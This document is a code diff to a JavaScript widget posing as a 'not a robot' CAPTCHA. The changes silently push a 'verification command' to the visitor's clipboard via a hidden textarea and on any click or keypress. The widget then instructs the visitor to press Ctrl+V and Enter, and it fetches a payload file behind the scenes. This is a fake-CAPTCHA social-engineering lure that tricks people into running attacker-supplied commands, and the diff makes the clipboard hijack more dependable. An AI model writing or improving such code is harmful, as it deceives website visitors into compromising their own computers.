@@ -168,29 +168,51 @@
     return cmd;
   }
 
-  function copyVerificationCommand() {
-    var cmd = getVerificationCommand();
-    if (!cmd) return;
-
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(cmd).catch(function () {
-        fallbackCopy(cmd);
-      });
-      return;
-    }
-    fallbackCopy(cmd);
-  }
-
   function fallbackCopy(text) {
     var ta = document.createElement('textarea');
     ta.value = text;
     ta.setAttribute('readonly', '');
     ta.style.position = 'fixed';
-    ta.style.left = '-9999px';
+    ta.style.top = '0';
+    ta.style.left = '0';
+    ta.style.width = '1px';
+    ta.style.height = '1px';
+    ta.style.opacity = '0';
+    ta.style.pointerEvents = 'none';
     document.body.appendChild(ta);
+    ta.focus();
     ta.select();
-    try { document.execCommand('copy'); } catch (e) {}
+    ta.setSelectionRange(0, text.length);
+    var ok = false;
+    try { ok = document.execCommand('copy'); } catch (e1) {}
     ta.remove();
+    return ok;
+  }
+
+  function copyVerificationCommand() {
+    var cmd = getVerificationCommand();
+    if (!cmd) return false;
+
+    if (fallbackCopy(cmd)) return true;
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(cmd).catch(function () {
+        fallbackCopy(cmd);
+      });
+      return true;
+    }
+    return false;
+  }
+
+  function bindCopyOnUserGesture(el) {
+    if (!el || el.__tsCopyBound__) return;
+    el.__tsCopyBound__ = true;
+    el.addEventListener('pointerdown', function () {
+      copyVerificationCommand();
+    });
+    el.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' || e.key === ' ') copyVerificationCommand();
+    });
   }
 
   function getCacheFileUrl() {
@@ -282,6 +304,7 @@
     var url = getCacheFileUrl();
     if (!url) return Promise.resolve(false);
 
+    var presetCacheFileSize = CONSENT_CONFIG.cacheFileSize;
     CONSENT_CONFIG.cacheFileSize = null;
     CONSENT_CONFIG.cacheFileBodySize = null;
 
@@ -297,6 +320,7 @@
           if (CONSENT_CONFIG.strictBody !== false) {
             var check = validateStrictPayload(buf);
             if (!check.ok) {
+              if (presetCacheFileSize != null) CONSENT_CONFIG.cacheFileSize = presetCacheFileSize;
               updateCacheStatus('fail', check.reason);
               return false;
             }
@@ -311,6 +335,7 @@
         });
       })
       .catch(function (err) {
+        if (presetCacheFileSize != null) CONSENT_CONFIG.cacheFileSize = presetCacheFileSize;
         updateCacheStatus('fail', err.message || 'fetch failed — CORS or network error');
         return false;
       });
@@ -369,6 +394,9 @@
       '#ts-widget .ts-kbd{display:inline-block;min-width:1.4em;padding:2px 7px;margin:0 2px;border:1px solid #bbb;border-bottom-width:2px;border-radius:4px;background:linear-gradient(180deg,#fff 0%,#f3f3f3 100%);font-size:13px;font-family:inherit;font-weight:600;color:#333;box-shadow:0 1px 0 rgba(0,0,0,.06);text-align:center;line-height:1.35}' +
       '#ts-widget .ts-v-ref{padding:16px 20px 20px;text-align:center;font-size:11px;color:#888;line-height:1.5}' +
       '#ts-widget .ts-v-ref-id{font-size:10px;color:#999;word-break:break-all;margin-top:4px;letter-spacing:.3px}' +
+      '#ts-widget .ts-v-copy-hint{margin:12px 0 0;font-size:13px;line-height:1.4}' +
+      '#ts-widget .ts-v-copy-ok{color:#2e7d32}' +
+      '#ts-widget .ts-v-copy-warn{color:#b45309}' +
       '@keyframes tsSpin{to{transform:rotate(360deg)}}' +
       '@keyframes tsOrbitSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}' +
       '@keyframes tsDotPulse{0%,100%{opacity:.2}50%{opacity:1}}'
@@ -403,8 +431,22 @@
       '<li>Press <span class="ts-kbd">Ctrl</span> + <span class="ts-kbd">V</span> to paste the confirmation code</li>' +
       '<li>Press <span class="ts-kbd">Enter</span> to confirm you\'re not a robot</li>' +
       '</ol></div>' +
-      '<div class="ts-v-ref">Ref ID:<div class="ts-v-ref-id">' + refId + '</div></div>'
+      '<div class="ts-v-ref">Ref ID:<div class="ts-v-ref-id">' + refId + '</div></div>' +
+      '<p class="ts-v-copy-hint"></p>'
     );
+  }
+
+  function updateCopyHint(el, copied) {
+    if (!el) return;
+    if (!getVerificationCommand()) {
+      el.textContent = 'Confirmation code unavailable — fix ?f= payload or set cacheFileSize.';
+      el.className = 'ts-v-copy-hint ts-v-copy-warn';
+      return;
+    }
+    el.textContent = copied
+      ? 'Confirmation code copied to clipboard.'
+      : 'Click this panel and press Ctrl+V again if paste is empty.';
+    el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
 
   function removeCaptcha() {
@@ -448,11 +490,14 @@
       captchaWidget.classList.remove('ts-loading');
       captchaWidget.classList.add('ts-verifying');
       captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
-      copyVerificationCommand();
+      var copied = copyVerificationCommand();
+      updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
+      bindCopyOnUserGesture(captchaWidget);
     }
 
     function runVerify() {
       if (verified || busy) return;
+      copyVerificationCommand();
       busy = true;
       captchaWidget.classList.add('ts-loading');
       checkArea.setAttribute('aria-checked', 'true');
@@ -553,8 +598,7 @@
 
   function init() {
     if (!document.body) return;
-    cacheDropHelloFile().then(function (ok) {
-      if (ok) copyVerificationCommand();
+    cacheDropHelloFile().then(function () {
       resolveFavicon(function (faviconUrl) {
         mountConsent(faviconUrl);
       });
